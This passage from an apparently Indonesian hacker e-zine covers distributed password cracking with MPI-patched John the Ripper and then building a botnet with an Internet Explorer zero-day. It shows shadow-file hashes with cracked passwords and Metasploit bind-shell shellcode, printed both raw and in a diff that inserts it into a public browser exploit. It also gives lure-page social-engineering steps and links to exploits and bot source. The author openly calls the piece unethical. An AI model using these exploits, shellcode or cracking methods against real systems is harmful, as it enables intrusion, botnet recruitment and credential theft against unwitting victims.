+5. Doez someone have idea how to protect from runtime kmem patching?!
+
+
+
+######################################################################
+	-- [0x03] -- Distributed Password Cracking
+######################################################################
+
+Salah satu aspek keamanan adalah memastikan data dan informasi diakses
+oleh pihak yang sah. Salah satu mekanisme yang digunakan adalah
+proses authentikasi. Proses authentikasi bisa dilakukan dengan beberapa
+metode diantaranya menggunakan pasangan username-password atau pasangan
+publik key dan private key. Pasangan username dan password lebih umum
+digunakan dalam proses authentikasi karena lebih familiar. Password
+biasanya disimpan oleh sistem operasi atau database dalam bentuk hash
+sehingga tersamarkan. Seorang attacker yang telah berhasil memperoleh
+hash password masih harus melakukan cracking untuk memperoleh plaintext
+password yang digunakan user.  
+
+[0x03]-[1] Password Cracking Review
+
+Password cracking merupakan sebuah proses untuk melakukan recovery
+password dari tempat/cara penyimpanan yang aman. Recovery dari 
+hash/encrypted menjadi plaintext password. Proses password cracking 
+dilakukan mungkin untuk tujuan illegal akses atau karena lupa password.
+Proses password cracking sendiri bisa dilakukan dengan beberapa cara
+yaitu:
+
+ - Metode guessing yaitu mencoba-coba atau menebak-nebak password
+   secara manual sampai password ditemukan. 
+ - Metode wordlist yaitu proses melakukan recovery password dengan
+   mencoba-coba password pada daftar word yang sudah disiapkan. Contoh
+   wordlist bisa dilihat pada /usr/share/dict/words.
+ - Metode brute force yaitu proses melakukan recovery password dengan
+   mencoba semua kemungkinan kata sampai password ditemukan.
+
+Proses password cracking selanjutnya sangat ditentukan oleh tingkat
+kerumitan password. Jika passwordnya sederhana, proses cracking sangat
+cepat tetapi ketika passwordnya rumit proses cracking bisa memakan waktu
+berhari-hari atau bahkan tahunan.
+
+Toolz untuk melakukan cracking password sendiri sudah cukup banyak
+tersebar di internet. Sehingga kita bisa melakukan password cracking
+dengan memanfaatkan tool-toolz tersebut. Hanya saja agar toolz tersebut
+bekerja sesuai keinginan, maka butuh customisasi tersendiri. Beberapa
+toolz password cracking diantaranya :
+
+- John The Ripper digunakan untuk melakukan recovery password dari hash
+  menjadi plaintext, cukup banyak jenis hash yang bisa dipecahkan
+  diantarnya DES, Blowfish, dan LM.
+- THC Hydra merupakan remote password cracker yang digunakan untuk
+  melakukan cracking password secara online. Password yang bisa di crack
+  diantaranya password FTP, POP3, SMTP, dan HTTP.
+
+Pada pembahasan selanjutnya, proses password cracking yang hendak
+dibahas adalah proses cracking password dari hash menjadi plaintext.
+Tool yang digunakan pun tool yang sudah sangat familiar yaitu John The
+Ripper. Hanya saja untuk keperluan distributed password cracking, John
+yang digunakan adalah john yang sudah dipatch dengan support MPI. 
+
+Untuk menyegarkan para pembaca, sebelum melanjutkan ke distributed
+password cracking saya hendak mengingatkan beberapa teknik cracking john
+the ripper. Ada 3 teknik cracking yang digunakan oleh john the ripper
+yaitu :
+
+ - single mode 		: john --single
+ - wordlist mode	: john --wordlist
+ - brute force mode	: john --incremental
+
+staff@eleet:~/Hack/john$ tail -10 shad-85-114.txt 
+master:$1$ptyb91AZ$UPDLoaRlMcoVZ2yu54yiV0:14103:0:99999:7:::
+kawats:$1$b6IO33AP$RcWdAgHRO6Z6QOtVd1jMR1:14103:0:99999:7:::
+bash:$1$qcqMW6kR$rLzTfl1HdmzY0HQN8gGB4/:14103:0:99999:7:::
+dream:$1$N5yihSLg$MECN5qGfuCwSqgoTYWEDL/:14115:0:99999:7:::
+gdm:$1$padfBbPO$VCdssDAwLIScdUxJch3Sh0:14103:0:99999:7:::
+wave:!$1$cDG3LPCq$5sauYJxswgTiXo6G7U0to1:14107:0:99999:7:::
+siebenstein:!$1$Q.8wqsOX$8zpfEGMyKyEk8cw1M8Y7l0:14107:0:99999:7:::
+terro:!$1$afgjt6Ai$pG1qrTy51PofrY6HXNe9d/:14110:0:99999:7:::
+naya:$1$haPTzhg7$94JRokUst91T2SxJm0aDk0:14123:0:99999:7:::
+lanzarote:!$1$J8Ltn8./$6xjOJZM532uA0hwCbxpcR0:14126:0:99999:7:::
+staff@eleet:~/Hack/john$ john -si shad-85-114.txt 
+Created directory: /opt/anto/.john
+Loaded 19 password hashes with 19 different salts (FreeBSD MD5 [32/32])
+stawak           (kawats)
+stawak           (master)
+guesses: 2  time: 0:00:00:17 100%  c/s: 3569  trying: khotstones1900
+staff@eleet:~/Hack/john$ john --wordlist=/usr/share/dict/words \
+> shad-85-114.txt 
+Loaded 17 password hashes with 17 different salts (FreeBSD MD5 [32/32])
+guesses: 0  time: 0:00:07:36 100%  c/s: 3659  trying: tudes
+staff@eleet:~/Hack/john$ john --incremental shad-85-114.txt 
+Loaded 17 password hashes with 17 different salts (FreeBSD MD5 [32/32])
+guesses: 0  time: 0:00:02:05  c/s: 3628  trying: bat
+Session aborted
+staff@eleet:~/Hack/john$ john --show shad-85-114.txt > cracked-85-114.txt
+staff@eleet:~/Hack/john$ cat cracked-85-114.txt 
+master:stawak:14103:0:99999:7:::
+kawats:stawak:14103:0:99999:7:::
+
+2 password hashes cracked, 17 left
+staff@eleet:~/Hack/john$ 
+
+John yang digunakan adalah versi john the ripper tanpa patch MPI yang
+bisa di download dari http://openwall.com/john/. Hasil proses cracking
+di atas memperoleh 2 plaintext dari 19 hash yang akan dicrack.
+
+[0x03]-[2] Clustering and Distributed Computing
+
+Cluster adalah kumpulan/group komputer yang saling bekerja sama
+melakukan sharing resource storage dan komputasi sehingga seolah
+membentuk sebuah single komputer. Biasanya komputer-komputer yang
+membentuk cluster terhubung pada sebuah jaringan lokal (LAN). Pada
+sebuah cluster komputer ada sebuah mesin yang disebut headnode (master)
+dan beberapa mesin yang disebut dengan node komputasi (slave).
+
+.............|master|
+................|
+................|
+..............switch 
+................|
+....-------------------------
+....|.....|.....|.....|.....|
+..SlaA..SlaB..SlaC..SlaD..SlaE
+
+
+Koneksi antar mesin dalam cluster pada sebuah LAN terhubung misalnya 
+melalui switch. Jika mungkin menggunakan koneksi gigabit sangat baik
+tetapi bisa juga menggunakan jaringan fast ethernet. Koneksi antar
+mesin dalam cluster harus baik untuk menghindari bottleneck jaringan.
+Mekanisme komputasi parallel menggunakan Message Parsing Interface 
+(MPI) yang merupakan standard de facto fungsi API pemrograman parallel.
+MPI sendiri sudah dikembangkan untuk mensupport beberapa bahasa
+pemrograman diantaranya fortran, C, C++, dan perl. Informasi lebih
+lanjut mengenai MPI ini bisa di ambil dari http://www.mpi-forum.org
+Beberapa catatan yang perlu digaris bawahi saat membuat cluster.
+
+1. Pastikan user yang akan menjalankan job bertipe MPI bisa login ke
+   masing-masing komputer slave tanpa password, bisa menggunakan ssh,
+   rsh atau rlogin. Gunakan public key authentication.
+2. File yang hendak dijalankan atau diolah secara paralel harus pada
+   media penyimpanan (storage) yang bisa diakses oleh seluruh node
+   cluster. Misalnya menggunakan storage bertipde file NFS atau sambafs
+   kemudian dimount ke seluruh node cluster.
+
+Untuk mendistribusikan job ke masing-masing node cluster bisa dilakukan
+dengan software schedulder seperti Sun Grid Engine, Condor, atau
+OpenPBS. Tetapi cluster saya menggunakan komunikasi point-to-point
+antar daemon LAM pada masing-masing node dalam cluster. LAM adalah salah
+satu aplikasi penyedia lingkungan development MPI. Menyediakan library
+dan kompiler MPI. Proses runtime komputasi parallel menggunakan LAM/MPI 
+bisa digambarkan sebagi berikut :
+
+-----------------------
+|     User Code       |
+-----------------------
+| MPI Layer(libmpi.a) |
+-----------------------
+| LAM layer(liblam.a) |
+-----------------------
+|   Sistem Operasi    |
+-----------------------
+
+User mengembangkan sebuah aplikasi berbasiskan MPI kemudian dikompile
+dengan kompiler mpi yang biasanya disebut "mpicc". Aplikasi executable
+hasil kompilasi MPI dijalankan menggunakan "mpirun". MPI Layer
+(libmpi.a) menerjemahkan proses runtime aplikasi tersebut menjadi sebuah
+proses yang dikerjakan secara terdistribusi. LAM layer (liblam.a) 
+mendistribusikan proses MPI ke masing-masing node dalam cluster melalui
+komunikasi point-to-point daemon LAM. Proses yang didistribusikan oleh
+LAM kemudian diekseksui oleh sistem operasi. Jika anda tertarik untuk
+melakukan pemrograman parallel, anda bisa memulainya dengan membaca
+artikel berikut:
+
+- http://en.wikipedia.org/wiki/Message_Passing_Interface
+- http://en.wikibooks.org/wiki/Programming:Message-Passing_Interface
+
+Saat ini komputasi parallel sudah banyak sekali membantu penelitian
+ilmiah dibidang kimia dan biokimia misalnya untuk keperluan analisis
+nucleotide dalam gen dan simulasi molekuler. Komputasi parallel juga
+sudah mulai digunakan untuk keperluan pengelolaan grafik dan video
+misalnya proses rendering parallel. Nah bagi para penjahat pencuri
+password komputasi parallel bisa digunakan untuk mempercepat proses
+cracking password dengan cracking terdistribusi.   
+ 
+[0x03]-[3] Distributed Password Cracking
+
+Distributed password cracking merupakan proses cracking password secara
+terdistribusi pada beberapa node dalam cluster. Seperti sudah disinggung
+sebelumnya proses cracking password terdistribusi dimaksudkan untuk
+mempercepat mendapatkan plaintext passwrod dan menghemat waktu. Aplikasi
+password cracking yang bisa berjalan secara terdistribusi sendiri sudah
+cukup banyak tersebar di internet. Beberapa diantaranya adalah:
+
+ - John The Ripper + Condor, proses distribusi cracking john dikerjakan 
+   oleh condor sebagai aplikasi scheduler cluster. John The Ripper yang
+   digunakan bisa didownload dari openwall sedangkan condor bisa di
+   download dari http://www.cs.wisc.edu/condor/.
+ - John The Ripper + Djohn, proses distribusi cracking dikerjakan oleh
+   djohn yang menggunakan komunikasi client-server. Djohn terdiri dari
+   aplikasi server yaitu "djohnd" yang dijalankan pada headnode cluster
+   dan djohn client yaitu "djohn" yang dijalankan pada slave cluster.
+   John The Ripper bisa didownload dari openwall sedangkan djohn bisa di
+   download dari http://ktulu.com.ar/djohn/.
+ - Medussa, merupakan aplikasi password cracker yang didesain untuk
+   berjalan pada lingkungan parallel/terdistribusi. Medussa
+   mendistribusikan proses password cracking dengan komunikasi
+   client-server. Aplikasi server yaitu "medussa" dijalankan pada
+   headnode dan aplikasi client yaitu "tentacle" dijalankan pada slave.
+   Medussa bisa didownload di http://www.bastard.net/~kos/medussa/.
+ - John The Ripper with MPI support, merupakan John The Ripper yang
+   dikembangkan dengan dukungan MPI. Distribusi cracking password bisa
+   dilakukan dengan aplikasi scheduler cluster. Saya sendiri
+   menjalankannnya pada lingkungan LAM/MPI. John The Ripper ini bisa
+   didownload dari http://www.bindshell.net/tools/johntheripper.
+
+Pada pembahasan selanjutnya saya menggunakan JTR-MPI support untuk
+menjelaskan secara teknis bagaimana proses cracking parallel. Cluster
+yang digunaan sendiri terdiri dari beberapa komputer dual core pentium 4
+3GHz dengan memori masing-masing 1G.
+
+staff@eleet:~$ cat /proc/cpuinfo 
+processor	: 0
+vendor_id	: GenuineIntel
+cpu family	: 15
+model		: 6
+model name	: Intel(R) Pentium(R) D CPU 3.00GHz
+stepping	: 4
+cpu MHz		: 3000.000
+cache size	: 2048 KB
+physical id	: 0
+siblings	: 2
+core id		: 0
+cpu cores	: 2
+fdiv_bug	: no
+hlt_bug		: no
+f00f_bug	: no
+coma_bug	: no
+fpu		: yes
+fpu_exception	: yes
+cpuid level	: 6
+wp		: yes
+flags		: fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge
+mca cmov pat pse36 clflush dts acpi mmx fxsr sse sse2 ss ht tm pbe nx lm
+constant_tsc pni monitor ds_cpl est cid xtpr
+bogomips	: 5986.08
+
+processor	: 1
+vendor_id	: GenuineIntel
+cpu family	: 15
+model		: 6
+model name	: Intel(R) Pentium(R) D CPU 3.00GHz
+stepping	: 4
+cpu MHz		: 2400.000
+cache size	: 2048 KB
+physical id	: 0
+siblings	: 2
+core id		: 1
+cpu cores	: 2
+fdiv_bug	: no
+hlt_bug		: no
+f00f_bug	: no
+coma_bug	: no
+fpu		: yes
+fpu_exception	: yes
+cpuid level	: 6
+wp		: yes
+flags		: fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge
+mca cmov pat pse36 clflush dts acpi mmx fxsr sse sse2 ss ht tm pbe nx lm
+constant_tsc pni monitor ds_cpl est cid xtpr
+bogomips	: 5980.16
+staff@eleet:~$ cat /proc/meminfo 
+MemTotal:      1026280 kB
+MemFree:         28536 kB
+Buffers:         70872 kB
+Cached:         311320 kB
+SwapCached:        528 kB
+Active:         885860 kB
+Inactive:        65308 kB
+HighTotal:      122656 kB
+HighFree:          252 kB
+LowTotal:       903624 kB
+LowFree:         28284 kB
+SwapTotal:     1020116 kB
+SwapFree:       994684 kB
+Dirty:             120 kB
+Writeback:           0 kB
+Mapped:         637748 kB
+Slab:            31248 kB
+CommitLimit:   1533256 kB
+Committed_AS:  1372076 kB
+PageTables:       5588 kB
+VmallocTotal:   106488 kB
+VmallocUsed:      4132 kB
+VmallocChunk:   101944 kB
+HugePages_Total:     0
+HugePages_Free:      0
+Hugepagesize:     2048 kB
+staff@eleet:~$ lamboot -v
+
+LAM 7.1.1/MPI 2 C++/ROMIO - Indiana University
+
+n-1<18736> ssi:boot:base:linear: booting n0 (hnode)
+n-1<18736> ssi:boot:base:linear: booting n1 (slave0-0)
+n-1<18736> ssi:boot:base:linear: booting n2 (slave0-1)
+n-1<18736> ssi:boot:base:linear: booting n3 (slave0-2)
+n-1<18736> ssi:boot:base:linear: booting n4 (slave0-3)
+n-1<18736> ssi:boot:base:linear: booting n5 (slave0-4)
+n-1<18736> ssi:boot:base:linear: booting n6 (slave0-5)
+n-1<18736> ssi:boot:base:linear: booting n7 (slave0-6)
+n-1<18736> ssi:boot:base:linear: booting n8 (slave0-7)
+n-1<18736> ssi:boot:base:linear: booting n9 (slave0-8)
+n-1<18736> ssi:boot:base:linear: booting n10 (slave0-9)
+n-1<18736> ssi:boot:base:linear: booting n11 (slave0-10)
+n-1<18736> ssi:boot:base:linear: booting n12 (slave0-11)
+n-1<18736> ssi:boot:base:linear: booting n13 (slave0-12)
+n-1<18736> ssi:boot:base:linear: booting n14 (slave0-13)
+n-1<18736> ssi:boot:base:linear: finished
+staff@eleet:~$ lamnodes   
+n0	hnode.cluster:2:origin,this_node
+n1	slave0-0.cluster:2:
+n2	slave0-1.cluster:2:
+n3	slave0-2.cluster:2:
+n4	slave0-3.cluster:2:
+n5	slave0-4.cluster:2:
+n6	slave0-5.cluster:2:
+n7	slave0-6.cluster:2:
+n8	slave0-7.cluster:2:
+n9	slave0-8.cluster:2:
+n10	slave0-9.cluster:2:
+n11	slave0-10.cluster:2:
+n12	slave0-11.cluster:2:
+n13	slave0-12.cluster:2:
+n14	slave0-13.cluster:2: 
+staff@eleet:~$
+
+Dari perintah lamnodes, diketahui ada 15 nodes yang aktif dalam cluster
+yaitu 1 headnode dan 14 slave. Nama masing-masing host node cluster
+sesuai ditunjukkan output lamnodes, angka 2 menunjukkan jumlah prosesor
+pada masing-masing node adalah dua (dual core). Origin merupakan host
+tempat mengaktifkan daemon "lamd". Proses installasi JTR-MPI silakan
+mengacu pada dokumentasi yang telah disediakan. Hasil benchmark JTR
+standar dan JTR-MPI berjalan pada 20 prosesor adalah sebagai berikut:
+
+staff@eleet:~/Hack/john$ ./john -test
+Benchmarking: Traditional DES [24/32 4K]... DONE
+Many salts:	269900 c/s real, 272627 c/s virtual
+Only one salt:	288076 c/s real, 292760 c/s virtual
+
+Benchmarking: BSDI DES (x725) [24/32 4K]... DONE
+Many salts:	11054 c/s real, 11143 c/s virtual
+Only one salt:	10528 c/s real, 10786 c/s virtual
+
+Benchmarking: FreeBSD MD5 [32/32]... DONE
+Raw:	8163 c/s real, 8246 c/s virtual
+
+Benchmarking: OpenBSD Blowfish (x32) [32/32]... DONE
+Raw:	424 c/s real, 426 c/s virtual
+
+Benchmarking: Kerberos AFS DES [24/32 4K]... DONE
+Short:	273254 c/s real, 278263 c/s virtual
+Long:	630886 c/s real, 649060 c/s virtual
+
+Benchmarking: NT LM DES [32/32 BS]... DONE
+Raw:	3307K c/s real, 3327K c/s virtual
+staff@eleet:~/Hack/john-mpi$ mpirun -np 20 -v n1-10 ./john -test
+17526 ./john running on n1
+16484 ./john running on n2
+29584 ./john running on n3
+29690 ./john running on n4
+5890 ./john running on n5
+29306 ./john running on n6
+28006 ./john running on n7
+16437 ./john running on n8
+27973 ./john running on n9
+29129 ./john running on n10
+17527 ./john running on n1
+16485 ./john running on n2
+29585 ./john running on n3
+29691 ./john running on n4
+5891 ./john running on n5
+29307 ./john running on n6
+28007 ./john running on n7
+16438 ./john running on n8
+27974 ./john running on n9
+29130 ./john running on n10
+Benchmarking: Traditional DES [24/32 4K]... DONE
+Many salts:	6017K c/s real, 6018K c/s virtual
+
+Only one salt:	6200K c/s real, 6201K c/s virtual
+
+Benchmarking: BSDI DES (x725) [24/32 4K]... DONE
+Many salts:	236189 c/s real, 236351 c/s virtual
+
+Only one salt:	232816 c/s real, 233049 c/s virtual
+
+Benchmarking: FreeBSD MD5 [32/32]... DONE
+Raw:	168738 c/s real, 168737 c/s virtual
+
+
+Benchmarking: OpenBSD Blowfish (x32) [32/32]... DONE
+Raw:	8507 c/s real, 8512 c/s virtual
+
+
+Benchmarking: Kerberos AFS DES [24/32 4K]... DONE
+Short:	5820K c/s real, 5822K c/s virtual
+
+Long:	13315K c/s real, 13318K c/s virtual
+
+Benchmarking: NT LM DES [32/32 BS]... DONE
+Raw:	73326K c/s real, 73363K c/s virtual
+
+(..edited..)
+
+Untuk perbandingan kecepatan cracking password, saya mengambil sample
+untuk FreeBSD MD5 [32/32] dan OpenBSD Blowfish (x32) [32/32] sebagai
+berikut:
+
+FreeBSD MD5 [32/32] Distributed/Single ~ 168738:8163 ~ 20,67 lebih cepat
+OpenBSD Blowfish (x32) Distributed/Single ~ 8507:424 ~ 20,06 lebih cepat
+
+Kecepatan yang cukup menyenangkan bukan?? Lalu bagaimana implementasi
+untuk melakukan cracking hash password? Akhir tahun 2008 kemaren sudah
+pernah didemokan oleh salah satu staff kami, Berikut siaran ulangnya :-)
+
+staff@eleet:~/Hack/john$ cat /tmp/y.txt 
+www:$1$WGG4dAzP$6p/BJ57andwWOs3wGI7R01:14216:0:99999:7:::
+staff@eleet:~/Hack/john$ ./john --incremental /tmp/y.txt 
+Loaded 1 password hash (FreeBSD MD5 [32/32])
+guesses: 0  time: 0:00:03:48  c/s: 8098  trying: scueene
+Session aborted
+staff@eleet:~/Hack/john$ cd ../john-mpi
+staff@eleet:~/Hack/john-mpi$ mpirun -np 20 n1-10 ./john --incremental \
+> /tmp/y.txt 
+Loaded 1 password hash (FreeBSD MD5 [32/32])
+Loaded 1 password hash (FreeBSD MD5 [32/32])
+Loaded 1 password hash (FreeBSD MD5 [32/32])
+Loaded 1 password hash (FreeBSD MD5 [32/32])
+Loaded 1 password hash (FreeBSD MD5 [32/32])
+Loaded 1 password hash (FreeBSD MD5 [32/32])
+Loaded 1 password hash (FreeBSD MD5 [32/32])
+Loaded 1 password hash (FreeBSD MD5 [32/32])
+Loaded 1 password hash (FreeBSD MD5 [32/32])
+Loaded 1 password hash (FreeBSD MD5 [32/32])
+Loaded 1 password hash (FreeBSD MD5 [32/32])
+Loaded 1 password hash (FreeBSD MD5 [32/32])
+Loaded 1 password hash (FreeBSD MD5 [32/32])
+Loaded 1 password hash (FreeBSD MD5 [32/32])
+Loaded 1 password hash (FreeBSD MD5 [32/32])
+Loaded 1 password hash (FreeBSD MD5 [32/32])
+Loaded 1 password hash (FreeBSD MD5 [32/32])
+Loaded 1 password hash (FreeBSD MD5 [32/32])
+Loaded 1 password hash (FreeBSD MD5 [32/32])
+Loaded 1 password hash (FreeBSD MD5 [32/32])
+h3ll             (www)
+Process 2 completed loop.
+thread: 2 guesses: 1  time: 0:00:00:53  c/s: 7890  trying: h3ll
+CTRL+C
+staff@eleet:~/Hack/john-mpi$
+
+Proses cracking serial dijalankan dalam waktu 3 menit 48 detik tapi
+belum bisa mendapatkan plaintext password dari FreeBSD MD5 [32/32] hash.
+Tetapi proses cracking terdistribusi menggunakan 20 prosesor hanya dalam
+waktu 53 detik sudah mampu menemukan plaintext password untuk hash
+FreeBSD MD5 [32/32] pada file /tmp/y.txt yaitu "h3ll".
+
+ABSOLUTELY HIGH SPEED! 
+
+
+
+######################################################################
+	-- [0x04] -- Setting Up Botnet Using IE 0day
+######################################################################
+
+Salah satu serangan yang tidak bisa dicegah adalah Denial of Service
+(DoS). Tipe serangan DoS bermacam-macam, dan yang sampai saat ini belum
+bisa ditangkal adalah jenis serangan DoS terdistribusi dengan teknik
+flooding jaringan. Untuk melakukan flooding secara terdistribusi (DDoS)
+diperlukan pasukan zombie yang dikontrol oleh attacker. Serangan DDoS
+dengan zombie-zombie ini bisa dilakukan dengan beragam toolz. Toolz DDoS
+yang pernah dikenal diantaranya adalah trinoo, stacheldraht, tfn, dan
+tfn2k. Saat ini proses DDoS bisa dilakukan dengan cara yang lebih mudah
+dari Internet Relay Chat (IRC) dengan menggunakan botnet.
+
+[0x04]-[1] Botnet and IE vulnerability Review
+
+Definisi botnet pada kasus denial of service adalah sekelompok bot yang 
+umumnya adalah merupakan komputer yang sudah di kompromise (zombie) 
+untuk menjalankan sebuah software tertentu. Software ini bisa berupa IRC
+bot yang digunakan sebagai backdoor, flooder dan keylogger. Botnet
+biasanya diinstall dan disebarkan melalui worm atau melalui exploitasi
+secara otomatis pada bugz baru. Seorang attacker bisa mengontrol
+kumpulan bot yang terinstall pada ribuan PC zombie melalui suatu channel
+IRC dengan mudah. Saat ini dikenal cukup banyak varian botnet
+diantaranya spybot, rxbot, sdbot, agobot, dan rbot. Anda bisa
+mendownload source code bot tersebut secara gratis di website 
+http://securitydot.net/exploits/bots/
+
+Untuk melakukan penyebaran dan installasi botnet tersebut, saat ini bisa
+dikatakan sebagi waktu yang tepat karena baru-baru ini microsoft baru
+ditimpa beberapa bencana yaitu dengan ditemukannya bugs ms08_067 netapi
+dan bugs IE XML parsing buffer overflow. Yang lebih menyenangkan adalah
+kedua bugs tersebut sudah muncul exploitnya sehingga memudahkan bagi
+kita untuk melakukan vandalisme internet. 
+
+(So, who does make th1z terrible sin?? Yezz, you're right! wh1tehat 
+who startz th1z terrible internet threat even they're always talking 
+about security!! Then, why do you write th1z unethical article??! 
+Personally, i don't care about ur computer/network security or simply 
+said th4t i don't care about the whole internet infrastructure 
+security. I just care about mine!) 
+
+Untuk bugs ms08_067 netapi, exploitnya bisa diperoleh dari
+ - Metasploit Framework 3.2
+ - http://milw0rm.com/exploits/7132
+ - http://milw0rm.com/exploits/7104
+Untuk bugs IE XML parsing buffer overlow, exploitnya bisa diperoleh dari
+ - http://milw0rm.com/exploits/7477
+ - http://milw0rm.com/exploits/7410
+ - http://milw0rm.com/exploits/7403
+
+Yang perlu kita lakukan adalah memodifikasi code-code tersebut agar
+berfungsi sebagi perantara penyebaran software botnet. Saya sendiri
+lebih memilih menggunakan bugs pada IE karena pada saat tulisan ini
+dibuat belum ada patch resmi dari microsoft. Saya memilih memodifikasi
+exploit buatan krafty (milw0rm exploit 7477) karena berfungsi pada
+beragam target windows. Finally Enjoy th1z unethical article!
+
+[0x04]-[2] IE 0day exploit
+
+IE 0day exploit merupakan code yang ditulis dengan javascript yang
+berguna untuk mengexploitasi celah IE XML parsing heap overflow. Code
+yang menurut saya cukup stabil bekerja hampir disemua IE adalah c0de
+yang ditulis oleh krafty. Exploit tulisan krafty akan mengeksekusi
+calc.exe di windows yang vulnerable. Oleh karena itu kita sendiri yang
+harus memodifikasi exploit tersebut agar bekerja sesuai keinginan kita.
+
+Sebelum lebih jauh membahas bagaimana peranan IE ini dalam penyebaran
+botnet, saya ingin membahas bagaimana IE berguna untuk mengcompromise
+sebuah mesin windows yang vulnerable dengan shellc0de bind tcp.
+Perlengkapan yang perlu ditambahkan untuk persiapan perang kita adalah
+metasploit yang digunakan untuk menggenerate shellc0de. Metasploit
+bisa menggenerate shellcode dengan msfpayload-nya. Tipe shellcode yang
+bisa digenerate pun cukup beragam untuk beberapa bahasa pemrograman.
+(Sejujurnya saya baru menyukai menggunakan metasploit minggu ini,
+sebelumnya bahkan tidak pernah memakai ha5, so fucking late rite?!).
+Proses menggenerate shellcode bind tcp untuk mengexploitasi celah IE
+windows bisa dilakukan dengan cara berikut:
+
+staff@eleet:~/Hack/meta# ./msfpayload windows/shell_bind_tcp\
+> EXITFUNC=process,LPORT=65535 J
+// windows/shell_bind_tcp - 317 bytes
+// http://www.metasploit.com
+// EXITFUNC=process, LPORT=65535, RHOST=
+%u6afc%u4deb%uf9e8%uffff%u60ff%u6c8b%u2424%u458b%u8b3c%u057c%u0178%u8bef%u184f%u5f8b%u0120%u49eb%u348b%u018b%u31ee%u99c0%u84ac%u74c0%uc107%u0dca%uc201%uf4eb%u543b%u2824%ue575%u5f8b%u0124%u66eb%u0c8b%u8b4b%u1c5f%ueb01%u2c03%u898b%u246c%u611c%u31c3%u64db%u438b%u8b30%u0c40%u708b%uad1c%u408b%u5e08%u8e68%u0e4e%u50ec%ud6ff%u5366%u6866%u3233%u7768%u3273%u545f%ud0ff%ucb68%ufced%u503b%ud6ff%u895f%u66e5%ued81%u0208%u6a55%uff02%u68d0%u09d9%uadf5%uff57%u53d6%u5353%u5353%u5343%u5343%ud0ff%u6866%uffff%u5366%ue189%u6895%u1aa4%uc770%uff57%u6ad6%u5110%uff55%u68d0%uada4%ue92e%uff57%u53d6%uff55%u68d0%u49e5%u4986%uff57%u50d6%u5454%uff55%u93d0%ue768%uc679%u5779%ud6ff%uff55%u66d0%u646a%u6866%u6d63%ue589%u506a%u2959%u89cc%u6ae7%u8944%u31e2%uf3c0%ufeaa%u2d42%u42fe%u932c%u7a8d%uab38%uabab%u7268%ub3fe%uff16%u4475%ud6ff%u575b%u5152%u5151%u016a%u5151%u5155%ud0ff%uad68%u05d9%u53ce%ud6ff%uff6a%u37ff%ud0ff%u578b%u83fc%u64c4%ud6ff%uff52%u68d0%ud87e%u73e2%uff53%uffd6%u41d0
+staff@eleet.com:~/Hack/meta#
+
+Shellc0de di atas berguna untuk memberikan akses shell di port 65535 dan
+bekerja pada bahasa pemrograman web javascript. Selanjutnya gunakan 
+shellcode tersebut pada exploit buatan krafty untuk mengganti shellc0de 
+exec calc.exe.
+
+staff@eleet:~/Hack/meta# diff -u 0day-ie-krafty.txt \
+> 0day-ie-krafty-bind.txt 
+--- 0day-ie-krafty.txt	2008-12-20 22:10:56.000000000 -0800
++++ 0day-ie-krafty-bind.txt	2008-12-25 21:15:58.000000000 -0800
+@@ -18,11 +18,11 @@
+ <html>
+ <div id="replace">x</div>
+ <script>
+-// windows/exec - 148 bytes
++// windows/shell_bind_tcp - 317 bytes
+ // http://www.metasploit.com
+-// Encoder: x86/shikata_ga_nai
+-// EXITFUNC=process, CMD=calc.exe
+-var shellcode = unescape("%uc92b%u1fb1%u0cbd%uc536%udb9b%ud9c5%u2474%u5af4%uea83%u31fc%u0b6a%u6a03%ud407%u6730%u5cff%u98bb%ud7ff%ua4fe%u9b74%uad05%u8b8b%u028d%ud893%ubccd%u35a2%u37b8%u4290%ua63a%u94e9%u9aa4%ud58d%ue5a3%u1f4c%ueb46%u4b8c%ud0ad%ua844%u524a%u3b81%ub80d%ud748%u4bd4%u6c46%u1392%u734a%u204f%uf86e%udc8e%ua207%u26b4%u04d4%ud084%uecba%u9782%u217c%ue8c0%uca8c%uf4a6%u4721%u0d2e%ua0b0%ucd2c%u00a8%ub05b%u43f4%u24e8%u7a9c%ubb85%u7dcb%ua07d%ued92%u09e1%u9631%u5580");
++// EXITFUNC=process, LPORT=65535, RHOST=
++var shellcode = unescape("%u6afc%u4deb%uf9e8%uffff%u60ff%u6c8b%u2424%u458b%u8b3c%u057c%u0178%u8bef%u184f%u5f8b%u0120%u49eb%u348b%u018b%u31ee%u99c0%u84ac%u74c0%uc107%u0dca%uc201%uf4eb%u543b%u2824%ue575%u5f8b%u0124%u66eb%u0c8b%u8b4b%u1c5f%ueb01%u2c03%u898b%u246c%u611c%u31c3%u64db%u438b%u8b30%u0c40%u708b%uad1c%u408b%u5e08%u8e68%u0e4e%u50ec%ud6ff%u5366%u6866%u3233%u7768%u3273%u545f%ud0ff%ucb68%ufced%u503b%ud6ff%u895f%u66e5%ued81%u0208%u6a55%uff02%u68d0%u09d9%uadf5%uff57%u53d6%u5353%u5353%u5343%u5343%ud0ff%u6866%uffff%u5366%ue189%u6895%u1aa4%uc770%uff57%u6ad6%u5110%uff55%u68d0%uada4%ue92e%uff57%u53d6%uff55%u68d0%u49e5%u4986%uff57%u50d6%u5454%uff55%u93d0%ue768%uc679%u5779%ud6ff%uff55%u66d0%u646a%u6866%u6d63%ue589%u506a%u2959%u89cc%u6ae7%u8944%u31e2%uf3c0%ufeaa%u2d42%u42fe%u932c%u7a8d%uab38%uabab%u7268%ub3fe%uff16%u4475%ud6ff%u575b%u5152%u5151%u016a%u5151%u5155%ud0ff%uad68%u05d9%u53ce%ud6ff%uff6a%u37ff%ud0ff%u578b%u83fc%u64c4%ud6ff%uff52%u68d0%ud87e%u73e2%uff53%uffd6%u41d0");
++
+ 
+ // ugly heap spray, the d0nkey way!
+ // works most of the time
+@@ -44,5 +44,3 @@
+ 
+ </script>
+ </html>
+-
+-# milw0rm.com [2008-12-15]
+\ No newline at end of file
+
+staff@eleet:~/Hack/meta# cp 0day-ie-krafty-bind.txt \
+> 0day-ie-krafty-bind.html
+staff@eleet:~/Hack/meta#
+
+Upload file 0day-ie-krafty-bind.html ke sebuah website dengan nama cukup
+menggoda misalnya http://my-web.com/bigz-toge-lunamaya.html atau
+http://my-web.com/we-fuck-leah-dizzon-lastnight-she-cumz-so-much.html.
+Lakukan social engineering pada seseorang yang hendak dijadikan korban
+untuk membuka halaman website tersebut. Jika korban tertarik membuka
+halaman tersebut, maka pada komputer korban akan membuka port 65535.
+
+D:\>netstat -an
+
+Active Connections
+
+  Proto  Local Address          Foreign Address        State
